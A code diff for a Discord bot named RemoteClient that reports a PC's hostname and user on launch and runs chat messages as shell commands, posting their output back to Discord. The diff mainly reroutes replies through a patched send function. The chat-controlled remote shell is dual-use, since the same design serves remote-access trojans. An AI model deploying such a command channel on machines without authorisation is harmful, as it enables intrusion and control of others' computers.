@@ -8,6 +8,7 @@ import time
 import traceback
 from datetime import datetime
 from io import BytesIO
+from typing import Optional, Sequence, Union
 import discord
 import dotenv
 import requests
@@ -111,7 +112,9 @@ class RemoteClient(discord.Client):
         await self.channel.send(
             f"Bot launched succesfully on PC {self.hostname} as {os.getlogin()}"
         )
-        await channel.send(f"Bot launched on {self.hostname} as {os.getlogin()} on channel {self.channel.mention}")
+        await channel.send(
+            f"Bot launched on {self.hostname} as {os.getlogin()} on channel {self.channel.mention}"
+        )
 
     async def on_message(self, message: discord.Message):
         """
@@ -130,32 +133,70 @@ class RemoteClient(discord.Client):
             if message.author.id == self.user.id:
                 return
             parsed = message.content.split(" ")
-            try:
-                
+            
+            async def patched_send(
+            content="",
+            tts=False,
+            embed=None,
+            file=None,
+            stickers=[],
+            delete_after=None,
+            nonce=None,
+            allowed_mentions=discord.AllowedMentions.all(),
+            reference=None,
+            mention_author=False,
+            view=None,
+            suppress_embeds=False,
+            silent=False,
+            poll=None,
+            ):
+                await message.channel.send(
+                    f"{self.channel.mention}\n{content}",
+                    embed=embed,
+                    file=file,
+                    stickers=stickers,
+                    delete_after=delete_after,
+                    nonce=nonce,
+                    allowed_mentions=allowed_mentions,
+                    reference=reference,
+                    mention_author=mention_author,
+                    view=view,
+                    suppress_embeds=suppress_embeds,
+                    silent=silent,
+                    poll=poll,
+                )
 
-                print(self.modules[parsed[0]])
+
+            if message.channel.id == int(os.getenv("GLOBAL_ID")):
+                # Replace the send method of the message's channel with the one from the new channel
+                send=patched_send
+            else:
+                send = message.channel.send
+
+            try:
                 if len(parsed) > 1:
-                    await self.modules[parsed[0]](self, message, " ".join(parsed[1:]))
+                    await self.modules[parsed[0]](self, message, " ".join(parsed[1:]), send)
                 else:
-                    await self.modules[parsed[0]](self, message, "")
+                    await self.modules[parsed[0]](self, message, "", send)
             except KeyError:
                 executor = functools.partial(exec_command, parsed)
                 res = await self.loop.run_in_executor(None, executor)
 
                 try:
                     if len(res[0]) > 0:
-                        
-                        await message.channel.send(f"Stdout: ```bat\n{res[0]}\n```")
+
+                        await send(f"Stdout: ```bat\n{res[0]}\n```")
                     if len(res[1]) > 0:
-                        await message.channel.send(f"Stderr: ```bat\n{res[1]}\n```")
+                        await send(f"Stderr: ```bat\n{res[1]}\n```")
                 except:
+                    traceback.print_exc()
                     f = BytesIO(f"Stdout: {res[0]}\n\nStderr: {res[1]}```".encode())
-                    await message.channel.send(file=discord.File(f, "output.txt"))
+                    await send(file=discord.File(f, "output.txt"))
 
             except:
                 traceback.print_exc()
                 exc = traceback.format_exc()
-                await message.channel.send(f"Python Errors: ```py\n{exc}\n```")
+                await send(f"Python Errors: ```py\n{exc}\n```")
 
 
 if __name__ == "__main__":
